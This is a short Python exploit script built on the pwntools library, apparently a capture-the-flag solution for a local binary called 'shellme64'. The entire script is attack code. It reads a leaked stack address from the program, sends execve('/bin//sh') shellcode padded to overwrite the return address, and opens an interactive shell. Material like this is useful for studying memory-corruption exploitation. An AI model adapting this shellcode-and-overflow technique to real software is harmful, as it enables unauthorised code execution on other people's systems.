from pwn import *

e = ELF('./shellme64')
p = process('./shellme64')

shellcode = "\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\xb0\x3b\x48\x89\xe7\x31\xf6\x31\xd2\x0f\x05"
ret_addr = 0x0000101a

print len(shellcode)
print p.recvuntil('\n')
addr = int(p.recvuntil('\n'),16)
print hex(addr)
print p.recvuntil('>')

payload = shellcode
payload += 'A'*(40-len(shellcode))
#payload += p64(ret_addr+8)
payload += p64(addr)

p.sendline(payload)
p.interactive()
print p.recv()